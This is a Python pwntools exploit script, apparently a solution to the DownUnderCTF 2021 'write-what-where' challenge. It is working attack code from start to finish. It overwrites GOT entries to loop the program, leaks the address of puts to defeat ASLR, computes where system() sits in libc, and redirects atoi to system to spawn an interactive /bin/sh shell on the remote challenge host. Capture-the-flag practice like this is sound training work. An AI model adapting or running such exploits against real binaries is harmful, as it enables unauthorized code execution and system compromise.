from pwn import *

e = ELF("./write-what-where",checksec=False)
context.binary = e

if args.REMOTE:
  pipe = remote("pwn-2021.duc.tf", 31920)
  l = ELF("libc.so.6",checksec=False)
else:
  pipe = process(e.path)
  l = e.libc

# overwrite got.exit to loop back to the write primitive and leak the memory at rax
pipe.sendafter(b"what?",p32(e.symbols["main"]+40))
pipe.sendafter(b"where?",str(e.symbols["got.exit"]).encode())

# overwrite the null bytes of _dl_runtime_resolve_xsavec so that we can leak the address of puts
pipe.sendafter(b"what?",b"AAAA")
pipe.sendafter(b"where?",str(e.symbols["got.puts"]-4).encode())

# read and process the leak
pipe.recv()
pipe.recv(4) # "AAAA"
puts_addr = u64(pipe.recv(6).ljust(8,b"\x00"))

l.address = puts_addr - l.symbols["puts"]
sys_addr = l.symbols["system"]

log.info(f"Leaked puts address ({hex(puts_addr)})")
log.info(f"Calculated system address ({hex(sys_addr)})")

# overwrite got.exit again to 16-byte align the stack
pipe.sendafter(b"what?",p32(e.symbols["main"]+40))
pipe.sendafter(b"where?",str(e.symbols["got.exit"]).encode())

# overwrite the lower 4 bytes of got.atoi to point to system()
pipe.sendafter(b"what?",p32(sys_addr & 0xffffffff))
pipe.sendafter(b"where?",str(e.symbols["got.atoi"]).encode())

# call atoi(/bin/sh\x00)
pipe.sendafter(b"what?",p32(e.symbols["data_start"]))
pipe.sendafter(b"where?",b"/bin/sh\x00")

pipe.interactive()
